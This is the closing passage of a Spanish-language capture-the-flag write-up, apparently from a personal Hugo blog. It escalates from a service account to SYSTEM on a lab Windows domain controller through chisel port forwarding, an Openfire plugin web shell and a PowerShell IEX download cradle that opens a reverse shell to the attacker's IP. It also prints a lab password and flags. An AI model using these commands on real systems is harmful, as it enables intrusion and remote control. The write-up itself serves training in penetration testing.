+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>jab\svc_openfire
+</span></span><span style="display:flex;"><span>PS C:\windows\system32&gt;
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>PS C:\Users\svc_openfire\Desktop&gt; type user.txt
+</span></span><span style="display:flex;"><span>d4c3ac560a3b52d...
+</span></span></code></pre></div><h1 id="privilege-escalation">Privilege Escalation</h1>
+<h3 id="reverse-port-forwarding">Reverse Port Forwarding</h3>
+<p>Como esta cuenta se llama <code>svc_openfire</code> supongo que debe de hacer un servicio de <code>OpenFire</code> detrás, así que busqué el puerto por defecto que utiliza.
+<img src="images/Screenshot_23.png" alt="Write-up Image"></p>
+<p>Con <code>netstat -ano</code>&hellip;
+<img src="images/Screenshot_24.png" alt="Write-up Image"></p>
+<p>Buscando por exploits, vemos que existen varios, entonces merece la pena con <code>chisel</code> hacer reverse port forwarding y echarle un vistazo.
+<img src="images/Screenshot_25.png" alt="Write-up Image"></p>
+<p>Compartimos el <code>chisel.exe</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\svc_openfire\Desktop&gt; iwr http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">80</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8081</span>/chisel.exe -o chisel.exe
+</span></span></code></pre></div><p>En la máquina atacante, nos ponemos en escucha por el puerto 1234.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/chisel/chisel server --reverse -p <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>2024/08/03 21:26:09 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span>2024/08/03 21:26:09 server: Fingerprint TkIa7XucA1PPZW9WeqCImhwJucZLEX5ANfBz0bNaYk4<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>2024/08/03 21:26:09 server: Listening on http://0.0.0.0:1234
+</span></span></code></pre></div><p>En la máquina víctima</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\svc_openfire\Desktop&gt; .\chisel.exe client <span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">80</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1234</span> R:<span style="color:#ae81ff">9090</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">9090</span>
+</span></span></code></pre></div><p>Y ahora, nuestro puerto 9090 local en la máquina atacante, corresponde al puerto 9090 de la máquina víctima.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>2024/08/03 21:26:44 server: session#1: tun: proxy#R:9090<span style="color:#f92672">=</span>&gt;9090: Listening
+</span></span></code></pre></div><p>Lo podemos comprobar..
+<img src="images/Screenshot_26.png" alt="Write-up Image"></p>
+<p>La versión es <code>Openfire, Version: 4.7.5</code></p>
+<p>Revisemos este <a href="https://github.com/miko550/CVE-2023-32315">PoC</a></p>
+<p>Este exploit se basa en una cadena de exploits, donde se abusa de <strong><a href="https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT">CVE-2023-32315</a></strong> saltándonos la autenticación, para posteriormente subir un plugin malicioso y conseguir una web shell.</p>
+<p>Aunque de nada sirve ya que las credenciales <code>svc_openfire:!@#$%^&amp;*(1qazxsw</code> sirven para poder iniciar sesión por lo cual nos podemos saltar la Authentication Bypass.</p>
+<p>Igualmente vamos a utilizar el archivo .jar que contiene la web shell.
+<img src="images/Screenshot_27.png" alt="Write-up Image"></p>
+<p><img src="images/Screenshot_28.png" alt="Write-up Image"></p>
+<p>Subimos el plugin correctamente.
+<img src="images/Screenshot_29.png" alt="Write-up Image"></p>
+<p>Nos dirigimos a la ruta <code>/plugins/openfire-management-tool-plugin/cmd.jsp</code></p>
+<p>Nos pide una contraseña, esta contraseña es 123.
+<img src="images/Screenshot_30.png" alt="Write-up Image"></p>
+<p>Y este servicio lo está ejecutando el equipo DC01$ por lo cual el usuario asociado es <code>nt authority\system</code>
+![[Screenshot_32.png]]</p>
+<p>Ahora ofrecemos de nuevo el <code>Invoke-PowerShellTcp.ps1</code> y ejecutamos <code>powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.80:8081/Invoke-PowerShellTcp.ps1') | powershell -noprofile</code> en la web shell para descargarnos este archivo y ejecutarlo, así obtendremos una reverse shell siempre que estemos en escucha con <code>netcat</code> por el puerto 443 ya que así edité el archivo anteriormente.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo rlwrap -cEr nc -lvnp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.80<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.230.215<span style="color:#f92672">]</span> <span style="color:#ae81ff">53632</span>
+</span></span><span style="display:flex;"><span>Windows PowerShell running as user DC01$ on DC01
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2015</span> Microsoft Corporation. All rights reserved.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\O</span>penfire<span style="color:#ae81ff">\b</span>in&gt;whoami
+</span></span><span style="display:flex;"><span>nt authority<span style="color:#ae81ff">\s</span>ystem
+</span></span></code></pre></div><p>Y ya podríamos leer la flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>PS C:\Users\Administrator\DESKTOP&gt; type root.txt
+</span></span><span style="display:flex;"><span>8183d8610ccffd7fda598bd31424ebfb
+</span></span></code></pre></div><p>Happy Hacking! 🚀</p>
+
+    </div>
+
+    
+
+            </div>
+        </div><footer class="text-center pb-1">
+    <small class="text-muted">
+        
+            &copy; 2024, Andrés Del Cerro
+        
+        <br>
+        Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a>
+        and <a href="https://github.com/austingebauer/devise" target="_blank">Devise</a>
+    </small>
+</footer>
+</body>
+</html>
